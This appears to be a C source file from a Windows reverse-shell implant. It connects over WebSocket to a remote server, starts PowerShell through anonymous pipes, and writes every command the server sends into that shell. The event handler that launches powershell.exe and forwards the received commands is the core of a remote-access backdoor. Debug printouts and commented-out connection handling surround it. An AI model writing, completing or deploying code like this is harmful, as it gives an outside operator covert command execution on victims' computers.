#include "pa5a.hpp"

EXTERN_C_START

BOOL WS_Connection() {

    /* 
        This function used for connecting the client to the remote server.
        WS_Connection also manage if the server is listening or not.

        This function is based on event send to the function event_handler who trigger connection,
        websocket handshake, closed connection or error.

        The function mg_ws_connect is use to connect the client to the remote server.

    */

    struct WebSocketData wsData = { 0 };
	struct mg_mgr event_manager;
	struct mg_connection* client_connection;

	mg_mgr_init(&event_manager);

    client_connection = mg_ws_connect(&event_manager, WS_SERVER_URL, event_handler, &wsData, NULL); // Create client

    for (DWORD iterationNumber = 0; ; iterationNumber++)
    {
        mg_mgr_poll(&event_manager, 1000);
        
        /*if (wsData.isClosed)
        {
            printf("La connexion a été fermée\n");
            break;
        }
        else if (!wsData.isConnected && iterationNumber > 1000)
        {
            printf("Connexion echouée\n");
            break;
        }
        else if (!wsData.isConnected)
        {
            if (event_manager.conns != NULL) {
                mg_mgr_free(&event_manager);
            }

            client_connection = mg_ws_connect(&event_manager, WS_SERVER_URL, event_handler, &wsData, NULL); // Create client
        }*/
    }

    if (event_manager.conns != NULL) {
        mg_mgr_free(&event_manager);   // Deallocate resources
    }

    return TRUE; 
}

void send_data(struct mg_connection* sock, char* buffer)
{
    mg_ws_send(sock, buffer, strlen(buffer), WEBSOCKET_OP_BINARY);
}


static void event_handler(struct mg_connection* c, int ev, void* ev_data, void* wsData){
   
    printf("Evenement = %d\n", ev);
    /*
        This function manage EVENT from the mongoose lib, it manages event for : 
            - Connection Error,
            - Websocket handshake is successful or not,
            - connection is established,
            - receive data,
            - or connection closed.

        When the event MG_EV_CONNECT is receive , connection is established so we start the creation
        of anonymous pipes and process creation.

        Also we set the variable isConnected to TRUE, is the tuyauterie made by Daniel for manage 
        open or closed connection
    */
    /*
    if (ev == MG_EV_ERROR){
        // On error, log error message
        printf("%p %s", c->fd, (char*)ev_data);
        LOG(LL_ERROR, ("%p %s", c->fd, (char*)ev_data));
    }*/
    if (ev == MG_EV_WS_OPEN){
        //websocket handshake is successful
        printf("[+] - Websocket Handshake Done, Received MG_EV_WS_OPEN EVENT\n");
    }
    else if (ev == MG_EV_CONNECT){

        //Here connection is successful !

        ((struct WebSocketData*)wsData)->socket = c;
      
        printf("[+] - Connection established, Received  MG_EV_CONNECT EVENT\n");

        if (CreatePipes((struct WebSocketData*)wsData) == FALSE){

            printf("Failed to CreatePipes\n");
            return;
        }

        printf("[+] - Pipes are create\n");

        if (CreateChildProcess(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", (struct WebSocketData*)wsData) == 0) {
          
            printf("Failed to create child process\n");
            return;
        }

        printf("[+] - Child process is now create\n");
        
        if (!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, wsData, 0, NULL)) {
        
            printf("Failed to CreateThread");
        }
       
        printf("[+] - The Thread is now create\n");
 
        ((struct WebSocketData*)wsData)->isConnected = TRUE;
    }
    else if (ev == MG_EV_WS_MSG){

        // When we get echo response, print it
        struct mg_ws_message* wm = (struct mg_ws_message*)ev_data;

        CHAR buffer[BUFSIZE] = { 0 };

        printf("COMMAND RECEIVE: [%.*s] \n", (int)wm->data.len, wm->data.ptr);


        sprintf_s(buffer,sizeof(buffer), "%.*s\n", (int)wm->data.len, wm->data.ptr);
        if (WriteToPipe(buffer, (struct WebSocketData*)wsData) == FALSE) {
            printf("Failed to write on pipe\n");
        }
    }
    /*if (ev == MG_EV_ERROR || ev == MG_EV_CLOSE){

        ((struct WebSocketData*)wsData)->isConnected = FALSE;
        ((struct WebSocketData*)wsData)->isClosed = TRUE;

        if (TerminateProcess(((struct WebSocketData*)wsData)->hCmdProcess, 0)) {
            printf("Process terminated! Bravo for your work. Bye!\n");
        }
        printf("GetLastError(%d)\n", GetLastError());
        printf("Connection Closed ! \n");
    }*/
}

EXTERN_C_END